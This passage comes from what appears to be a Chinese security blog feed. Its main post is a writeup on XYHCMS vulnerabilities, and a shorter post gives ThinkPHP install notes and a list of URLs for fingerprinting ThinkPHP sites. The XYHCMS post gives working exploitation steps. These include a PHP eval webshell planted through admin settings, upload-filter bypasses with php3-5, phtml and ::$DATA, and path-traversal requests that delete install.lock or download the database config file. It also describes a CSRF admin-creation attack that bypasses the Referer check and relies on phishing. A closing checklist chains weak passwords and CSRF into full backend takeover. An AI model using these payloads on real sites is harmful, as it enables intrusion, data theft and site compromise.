class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">$this-&gt;error(&#39;禁止输入php代码&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">————————————————————————————————————————————————————————————————————————————</span></pre></td></tr></table></figure></li><li><h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ol><li><p>进入后台</p></li><li><p>系统设置-&gt;网站设置-&gt;会员配置-&gt;禁止使用的名称</p><p><img src="/images/xyhcms-1.png" alt="xyhcms"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;?eval($_POST[&#39;cmd&#39;])?&gt;</span></pre></td></tr></table></figure></li><li><p>访问漏洞文件,蚁剑连接</p><p><code>http://localhost/App/Runtime/Data/config/site.php</code></p><p>POST数据：<code>cmd=phpinfo();</code></p></li></ol></li><li><h4 id="实际利用-1"><a href="#实际利用-1" class="headerlink" title="实际利用"></a>实际利用</h4><p>v3.6也存在</p></li></ul><h3 id="文件写入导致代码执行漏洞2（后台）"><a href="#文件写入导致代码执行漏洞2（后台）" class="headerlink" title="文件写入导致代码执行漏洞2（后台）"></a>文件写入导致代码执行漏洞2（后台）</h3><ul><li><h4 id="漏洞原因-2"><a href="#漏洞原因-2" class="headerlink" title="漏洞原因"></a>漏洞原因</h4><p>过滤不严</p></li><li><h4 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ol><li><p>进入后台</p></li><li><p>系统设置-&gt;网站设置找个任意的配置</p></li><li><p>在输入框内都填</p><p><code>&lt;?php phpinfo()?&gt;</code></p></li><li><p>访问漏洞文件</p><p><code>http://localhost/App/Runtime/Data/config/site.php</code></p></li><li><p>此漏洞在最新版的v3.6也存在</p></li></ol></li><li><h4 id="实际利用-2"><a href="#实际利用-2" class="headerlink" title="实际利用"></a>实际利用</h4><p>v3.5，v3.6都利用成功</p></li></ul><h3 id="文件上传漏洞（后台-amp-配置了-htaccess）"><a href="#文件上传漏洞（后台-amp-配置了-htaccess）" class="headerlink" title="文件上传漏洞（后台&amp;配置了.htaccess）"></a>文件上传漏洞（后台&amp;配置了.htaccess）</h3><ul><li><h4 id="漏洞文件位置-2"><a href="#漏洞文件位置-2" class="headerlink" title="漏洞文件位置"></a>漏洞文件位置</h4><p><code>/App/Manage/Controller/SystemController.class.php</code> Line 246-255</p></li><li><h4 id="漏洞原因-3"><a href="#漏洞原因-3" class="headerlink" title="漏洞原因"></a>漏洞原因</h4><p>对后缀过滤不严，未过滤php3-5，phtml（老版本直接未过滤php）</p></li><li><h4 id="漏洞代码-2"><a href="#漏洞代码-2" class="headerlink" title="漏洞代码"></a>漏洞代码</h4><p>在site方法中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">if (!empty($data[&#39;CFG_UPLOAD_FILE_EXT&#39;])) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$data[&#39;CFG_UPLOAD_FILE_EXT&#39;] &#x3D; strtolower($data[&#39;CFG_UPLOAD_FILE_EXT&#39;]);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">$_file_exts &#x3D; explode(&#39;,&#39;, $data[&#39;CFG_UPLOAD_FILE_EXT&#39;]);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">$_no_exts &#x3D; array(&#39;php&#39;, &#39;asp&#39;, &#39;aspx&#39;, &#39;jsp&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">foreach ($_file_exts as $ext) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">if (in_array($ext, $_no_exts)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">$this-&gt;error(&#39;允许附件类型错误！不允许后缀为：php,asp,aspx,jsp！&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure></li><li><h4 id="漏洞利用-3"><a href="#漏洞利用-3" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ol><li><p>进入后台</p></li><li><p>系统设置-&gt;网站设置-&gt;上传配置-&gt;允许附件类型</p></li><li><p>添加类型 <code>php3</code>或 <code>php4</code>或 <code>php5</code> 或 <code>phtml</code></p></li><li><p>点击下面的 <code>水印图片上传</code>上传以上后缀shell，此时点不点提交都已经传入服务器</p></li><li><p>之后会在图片部分显示上传路径</p><p><img src="/images/xyhcms-2.png" alt="image2"></p></li><li><p>访问连接即可，只有网站配置了.htaccess自动解析php3-5与phtml的才能解析。</p></li></ol></li><li><h4 id="实际利用-3"><a href="#实际利用-3" class="headerlink" title="实际利用"></a>实际利用</h4><p>上传成功，但是不解析shell</p><p>V3.6也存在此漏洞</p><p>默认不解析php3-5,除非遇到个别的站</p></li></ul><h3 id="文件上传漏洞2（后台-amp-windows）"><a href="#文件上传漏洞2（后台-amp-windows）" class="headerlink" title="文件上传漏洞2（后台&amp;windows）"></a>文件上传漏洞2（后台&amp;windows）</h3><ul><li><h4 id="漏洞文件位置-3"><a href="#漏洞文件位置-3" class="headerlink" title="漏洞文件位置"></a>漏洞文件位置</h4><p><code>/App/Manage/Controller/SystemController.class.php</code></p></li><li><h4 id="漏洞原因-4"><a href="#漏洞原因-4" class="headerlink" title="漏洞原因"></a>漏洞原因</h4><p>windows系统特性，windows会将 <code>::$DATA</code>忽略</p></li><li><h4 id="漏洞代码-3"><a href="#漏洞代码-3" class="headerlink" title="漏洞代码"></a>漏洞代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">if (!empty($data[&#39;CFG_UPLOAD_FILE_EXT&#39;])) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$data[&#39;CFG_UPLOAD_FILE_EXT&#39;] &#x3D; strtolower($data[&#39;CFG_UPLOAD_FILE_EXT&#39;]);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">$_file_exts &#x3D; explode(&#39;,&#39;, $data[&#39;CFG_UPLOAD_FILE_EXT&#39;]);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">$_no_exts &#x3D; array(&#39;php&#39;, &#39;asp&#39;, &#39;aspx&#39;, &#39;jsp&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">foreach ($_file_exts as $ext) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">if (in_array($ext, $_no_exts)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">$this-&gt;error(&#39;允许附件类型错误！不允许后缀为：php,asp,aspx,jsp！&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure></li><li><h4 id="漏洞利用-4"><a href="#漏洞利用-4" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ol><li>进入后台</li><li>系统设置-&gt;网站设置-&gt;上传配置-&gt;允许附件类型</li><li>添加类型 <code>shell.php::$DATA</code></li><li>点击下面的 <code>水印图片上传</code>上传以上后缀shell，此时点不点提交都已经传入服务器</li><li>之后会在图片部分显示上传路径，在windows下面，会自动忽略后面的。</li><li>用蚁剑访问 <code>http://domain/路径去掉::$DATA</code></li></ol></li></ul><h3 id="任意文件删除漏洞（后台）"><a href="#任意文件删除漏洞（后台）" class="headerlink" title="任意文件删除漏洞（后台）"></a>任意文件删除漏洞（后台）</h3><ul><li><h4 id="漏洞文件位置-4"><a href="#漏洞文件位置-4" class="headerlink" title="漏洞文件位置"></a>漏洞文件位置</h4><p><code>/App/Manage/Controller/DatabaseController.class.php</code></p></li><li><h4 id="漏洞原因-5"><a href="#漏洞原因-5" class="headerlink" title="漏洞原因"></a>漏洞原因</h4><p>路径过滤不严</p></li><li><h4 id="漏洞代码-4"><a href="#漏洞代码-4" class="headerlink" title="漏洞代码"></a>漏洞代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;删除sql文件</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">public function delSqlFiles() &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">$id &#x3D; I(&#39;id&#39;, 0, &#39;intval&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">$batchFlag &#x3D; I(&#39;get.batchFlag&#39;, 0, &#39;intval&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;批量删除</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">if ($batchFlag) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">$files &#x3D; I(&#39;key&#39;, array());</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">&#125; else &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">$files[] &#x3D; I(&#39;sqlfilename&#39;, &#39;&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">if (empty($files)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">$this-&gt;error(&#39;请选择要删除的sql文件&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">foreach ($files as $file) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">$_ext &#x3D; pathinfo($file, PATHINFO_EXTENSION);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;拼接后直接删除</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">foreach ($files as $file) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">unlink($this-&gt;getDbPath() . &#39;&#x2F;&#39; . $file);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">$this-&gt;success(&quot;已删除：&quot; . implode(&quot;,&quot;, $files), U(&#39;Database&#x2F;restore&#39;));</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure><p>删除的文件位置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">public function getDbPath() &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">return &#39;.&#x2F;Data&#x2F;resource&#x2F;backupdata&#39;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure></li></ul><ul><li><h4 id="漏洞利用-5"><a href="#漏洞利用-5" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ol><li><p>登录后台</p></li><li><p>删除安装锁文件</p><ol><li><p>get方式</p><p><code>http://domain/xyhai.php? s=/Database/delSqlFiles/sqlfilename/..\\..\\..\\install/install.lock</code></p></li><li><p>post方式</p><p><code>http://domain/xyhai.php?s=/Database/delSqlFiles/batchFlag/1</code></p><p>POST数据：<code>key[]=../../../install/install.lock</code></p></li></ol></li><li><p>之后访问 <code>http://domain/install</code>重装cms</p></li></ol></li><li><h4 id="实际利用-4"><a href="#实际利用-4" class="headerlink" title="实际利用"></a>实际利用</h4><p>在官网发布的v3.5版本已经做了过滤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">if (false !&#x3D;&#x3D; strpos($file, &#39;..&#x2F;&#39;) || false !&#x3D;&#x3D; strpos($file, &#39;..\\&#39;) || $_ext !&#x3D; &#39;sql&#39;) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$this-&gt;error(&#39;删除失败：sql文件非法！&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure><p>所以之后下载的没这个漏洞了，之前下载才有这个漏洞。</p></li></ul><h3 id="任意文件下载（后台）"><a href="#任意文件下载（后台）" class="headerlink" title="任意文件下载（后台）"></a>任意文件下载（后台）</h3><ul><li><h4 id="漏洞文件位置-5"><a href="#漏洞文件位置-5" class="headerlink" title="漏洞文件位置"></a>漏洞文件位置</h4><p><code>/App/Manage/Controller/DatabaseController.class.php</code>的<code>downfile()</code>方法</p></li><li><h4 id="漏洞原因-6"><a href="#漏洞原因-6" class="headerlink" title="漏洞原因"></a>漏洞原因</h4><p> 没有对下载的文件做任何限制 </p></li><li><h4 id="漏洞代码-5"><a href="#漏洞代码-5" class="headerlink" title="漏洞代码"></a>漏洞代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">public function downFile() &#123;  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">    if (empty($_GET[&#39;file&#39;]) || empty($_GET[&#39;type&#39;]) || !in_array($_GET[&#39;type&#39;], array(&quot;zip&quot;, &quot;sql&quot;))) &#123;  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">        $this-&gt;error(&quot;下载地址不存在&quot;);  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">    &#125;  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">    $path     &#x3D; array(&quot;zip&quot; &#x3D;&gt; $this-&gt;getDbPath() . &quot;Zip&#x2F;&quot;, &quot;sql&quot; &#x3D;&gt; $this-&gt;getDbPath() . &#39;&#x2F;&#39;);  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">    $filePath &#x3D; $path[$_GET[&#39;type&#39;]] . $_GET[&#39;file&#39;];  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">    if (!file_exists($filePath)) &#123;  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">        $this-&gt;error(&quot;该文件不存在，可能是被删除&quot;);  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">    &#125;  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">     $filename &#x3D; basename($filePath);  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">     header(&quot;Content-type: application&#x2F;octet-stream&quot;);  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">     header(&#39;Content-Disposition: attachment; filename&#x3D;&quot;&#39; . $filename . &#39;&quot;&#39;);  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">     header(&quot;Content-Length: &quot; . filesize($filePath));  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">     readfile($filePath);  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line"> &#125;</span></pre></td></tr></table></figure></li><li><h4 id="漏洞利用-6"><a href="#漏洞利用-6" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ol><li>登录后台</li><li>访问<code>http://domain/xyhai.php?s=/Database/downFile/file/..\\..\\..\\App\\Common\\Conf\\db.php/type/zip</code></li><li>下载到数据库配置文件</li></ol></li><li><h4 id="实际利用-5"><a href="#实际利用-5" class="headerlink" title="实际利用"></a>实际利用</h4><p> 在v3.5版本中，<code>/App/Manage/Controller/DatabaseController.class.php</code>文件的最后更改时间为 <code>2019/9/16</code>，洞被补上了，downfile方法直接被删除了。</p></li></ul><h3 id="CSRF漏洞"><a href="#CSRF漏洞" class="headerlink" title="CSRF漏洞"></a>CSRF漏洞</h3><ul><li><h4 id="漏洞文件位置-6"><a href="#漏洞文件位置-6" class="headerlink" title="漏洞文件位置"></a>漏洞文件位置</h4><p><code>App/Manager/Controller/AuthController.class.php</code></p></li><li><h4 id="漏洞原因-7"><a href="#漏洞原因-7" class="headerlink" title="漏洞原因"></a>漏洞原因</h4><p>验证不严，在别人报送漏洞后，虽然加了一个验证，但是可以绕过。</p></li><li><h4 id="漏洞代码-6"><a href="#漏洞代码-6" class="headerlink" title="漏洞代码"></a>漏洞代码</h4><p>`public function addUser() {</p><pre><code>if (IS_POST) {    //用户组    $group_id   = I(&apos;group_id&apos;, array());    $department = I(&apos;department&apos;, array());    $_furl      = $_SERVER[&apos;HTTP_REFERER&apos;];    $_turl      = &apos;://&apos; . $_SERVER[&apos;HTTP_HOST&apos;] . $_SERVER[&apos;REQUEST_URI&apos;];     //HTTP_HOST有端口会带端口          //在这里验证了refere头，但是可以referre可由我们控制          if (stripos($_furl, $_turl) === false) {              $this-&gt;error(&apos;非法请求!&apos;);          }          if (empty($department)) {              $this-&gt;error(&apos;请选择部门&apos;);          }          if (empty($group_id)) {              $this-&gt;error(&apos;请选择职位&apos;);          }          //M验证          $validate = array(              array(&apos;username&apos;, &apos;require&apos;, &apos;用户名不能为空！&apos;),              array(&apos;password&apos;, &apos;require&apos;, &apos;密码不能为空！&apos;),              array(&apos;password&apos;, &apos;5,20&apos;, &apos;密码必须在5到20位之间&apos;, 0, &apos;length&apos;),              array(&apos;username&apos;, &apos;&apos;, &apos;用户名已经存在！&apos;, 0, &apos;unique&apos;, 1),          );          $data = M(&apos;Admin&apos;);          if (!$data-&gt;validate($validate)-&gt;create()) {              $this-&gt;error($data-&gt;getError());          }          $password         = get_password($data-&gt;password);          $data-&gt;password   = $password[&apos;password&apos;];          $data-&gt;encrypt    = $password[&apos;encrypt&apos;];          $data-&gt;status     = I(&apos;status&apos;, 0, &apos;intval&apos;);          $data-&gt;department = implode(&apos;,&apos;, $department);          $data-&gt;login_time = date(&apos;Y-m-d H:i:s&apos;);          $data-&gt;login_ip   = &apos;&apos;;          if ($id = $data-&gt;add()) {              $group_data = array();              foreach ($group_id as $key =&gt; $val) {                  $group_data[] = array(&apos;uid&apos; =&gt; $id, &apos;group_id&apos; =&gt; $val);              }              $result = M(&apos;AuthGroupAccess&apos;)-&gt;addAll($group_data);              if ($result) {                  $this-&gt;success(&apos;添加成功&apos;, U(&apos;indexOfUser&apos;));              } else {                  $this-&gt;error(&apos;权限设置失败|用户添加成功&apos;);              }          } else {              $this-&gt;error(&apos;添加失败&apos;);          }          exit();      }</code></pre></li></ul><ul><li><h4 id="漏洞利用-7"><a href="#漏洞利用-7" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ol><li>在自己服务器构造html代码，要绕过referer，以前写过类似的文章</li><li>生成短链接</li><li>到网站留言，等鱼儿上钩。</li><li>等添加后登录即可</li></ol></li><li><h4 id="实际利用-6"><a href="#实际利用-6" class="headerlink" title="实际利用"></a>实际利用</h4><p>v2 ，v3.6也存在</p><p>v2版本url  <code>http://domain/index.php?g=Manage&amp;m=Rbac&amp;a=addUser</code></p></li></ul><h3 id="综合利用"><a href="#综合利用" class="headerlink" title="综合利用"></a>综合利用</h3><ol><li><p>先尝试弱口令</p></li><li><p>再尝试csrf拿到管理员权限</p></li><li><p>拿到后台随便搞</p></li><li><p>心中默念安全法</p></li></ol><h3 id="坑"><a href="#坑" class="headerlink" title="坑"></a>坑</h3><p>经过几个网站测试，发现后台xyhai.php文件可能会被改，可以尝试admin.php</p>]]></content>
    
    <summary type="html">
    
      phpthink架构的xyhcms漏洞整理
    
    </summary>
    
    
      <category term="漏洞" scheme="http://h3art3ars.github.io/categories/%E6%BC%8F%E6%B4%9E/"/>
    
    
      <category term="漏洞" scheme="http://h3art3ars.github.io/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="代码审计" scheme="http://h3art3ars.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="web" scheme="http://h3art3ars.github.io/tags/web/"/>
    
      <category term="cms" scheme="http://h3art3ars.github.io/tags/cms/"/>
    
  </entry>
  
  <entry>
    <title>thinkphp Notes</title>
    <link href="http://h3art3ars.github.io/2019/12/23/thinkphp-Notes/"/>
    <id>http://h3art3ars.github.io/2019/12/23/thinkphp-Notes/</id>
    <published>2019-12-23T04:47:06.000Z</published>
    <updated>2019-12-23T04:51:53.041Z</updated>
    
    <content type="html"><![CDATA[<h2 id="thinkphp安装"><a href="#thinkphp安装" class="headerlink" title="thinkphp安装"></a>thinkphp安装</h2><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">composer create-project topthink&#x2F;think tp</span></pre></td></tr></table></figure><p>启动服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">cd tp</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">php think run</span></pre></td></tr></table></figure><p>然后就可以在浏览器中访问</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8000</span></pre></td></tr></table></figure><p>如果需要更新框架使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">composer update topthink&#x2F;framework</span></pre></td></tr></table></figure><hr><h2 id="thinkphp-cms-特征目录识别"><a href="#thinkphp-cms-特征目录识别" class="headerlink" title="thinkphp cms 特征目录识别"></a>thinkphp cms 特征目录识别</h2><p>thinkphp的文件可能会放在网站根目录，也可能放在/ThinkPHP内或者独自建立/thinkphp文件夹放进去。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;index.php?c&#x3D;4e5e5d7364f443e28fbf0d3ae744a59a</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;4e5e5d7364f443e28fbf0d3ae744a59a</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;LICENSE.txt</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;logo.png</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;README.md</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;composer.json</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;Application&#x2F;README.md</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;Extend&#x2F;README.txt</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;Extend&#x2F;Vendor&#x2F;readme.txt</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;ThinkPHP&#x2F;LICENSE.txt</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;ThinkPHP&#x2F;logo.png</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;ThinkPHP&#x2F;composer.json</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;ThinkPHP&#x2F;Application&#x2F;README.md</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;ThinkPHP&#x2F;Extend&#x2F;README.txt</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;ThinkPHP&#x2F;Extend&#x2F;Vendor&#x2F;readme.txt</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;think</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;phpunit.xml</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;public&#x2F;favicon.ico</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;public&#x2F;robots.txt</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;thinkphp&#x2F;.travis.yml</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;thinkphp&#x2F;codecov.yml</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;thinkphp&#x2F;CONTRIBUTING.md</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;thinkphp&#x2F;LICENSE.txt</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;thinkphp&#x2F;logo.png</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;thinkphp&#x2F;composer.json</span></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      phpthink杂七杂八笔记
    
    </summary>
    
    
      <category term="Notes" scheme="http://h3art3ars.github.io/categories/Notes/"/>
    
    
      <category term="thinkphp" scheme="http://h3art3ars.github.io/tags/thinkphp/"/>
    
